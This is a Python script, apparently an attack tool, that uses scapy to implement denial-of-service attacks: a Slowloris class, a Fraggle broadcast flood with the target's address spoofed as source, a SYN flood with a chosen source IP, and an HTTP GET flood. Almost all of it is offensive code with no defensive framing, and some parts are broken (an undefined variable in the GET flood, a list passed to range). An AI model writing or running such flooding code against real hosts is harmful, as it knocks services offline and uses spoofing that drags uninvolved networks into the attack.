from scapy.all import *
from colors import *
import sys, time
import logging
import socket
import random

logging.basicConfig(level=logging.INFO, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")

user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
sockets__ = []

class slowloris:

    def __init__(self, sock_count, target):
        self.target = target
        self.packet = IP(dst=self.target)/TCP()
        self.USER_AGENT = "User-Agent: {}\r\n".format(user_agent).encode('utf-8')
        self.CONT_LEN = b"Content-Length: 42\r\n"
        self.sock_count = sock_count

    def create(self):
        conf.verb = 0
        for x in range(len(sockets__)):
            GET = "GET /?{} HTTP/1.1\r\n".format(random.randint(1, 2000)).encode('utf-8')
            send(self.packet/GET)
            send(self.packet/self.USER_AGENT)
            send(self.packet/self.CONT_LEN)
    
    def append_sockets(self):
        for x in range(self.sock_count):
            logging.info(" Appending socket number: {}".format(x))
            try:
                s = self.packet
            except socket.error:
                break
            sockets__.append(s)
    
    def attack(self):
        conf.verb = 0
        self.append_sockets()
        self.create()
        while True:
            logging.info(" Sending keep-alive headers...")
            for s in sockets__:
                keep_alive = "X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8')
                try:
                    pkt = s/keep_alive
                    send(pkt)
                except KeyboardInterrupt:
                    logging.info(" Exiting...")
                    sys.exit(0)
                except socket.error:
                    logging.info(" Resending GET request...")
                    sockets__.remove(s)
                    try:
                        for x in range(sockets__):
                            self.create()
                    except socket.error:
                        continue
            time.sleep(15)

def fraggle(tgtIP):
    count = 0
    conf.verb = 0
    try:
        logging.info(" Attacking {}...".format(tgtIP))
        time.sleep(0.5)
        while True:
            send(IP(src=tgtIP, dst="255.255.255.255")/UDP(dport=53))
            logging.info("{0}[{1}{2}{0}] {3}Packets sent{0}".format(RST, DGREY, count, RD))
            count += 1
    except KeyboardInterrupt:
        logging.info(" Exiting...")
        sys.exit(0)

def synflood(tgtIP, port, srcIP):
    conf.verb = 0
    count = 0
    try:
        logging.info(" Attacking {}...".format(tgtIP))
        time.sleep(0.5)
        while True:
            send(IP(src=srcIP, dst=tgtIP)/TCP(dport=port, flags='S'))
            logging.info("{0}[{1}{2}{0}] {3}Packets sent{0}".format(RST, DGREY, count, RD))
            count += 1
    except KeyboardInterrupt:
        logging.info(" Exiting...")
        sys.exit(0)

def GETflood(tgtIP):
    conf.verb = 0
    count = 0
    try:
        logging.info(" Attacking {}...".format(tgtIP))
        time.sleep(0.5)
        while True:
            send(IP(src=srcIP, dst=tgtIP)/TCP()/b"GET / HTTP/1.1\r\n\r\n")
            logging.info("{0}[{1}{2}{0}] {3}Requests sent{0}".format(RST, DGREY, count, RD))
            count += 1
    except KeyboardInterrupt:
        logging.info(" Exiting...")
        sys.exit(0)
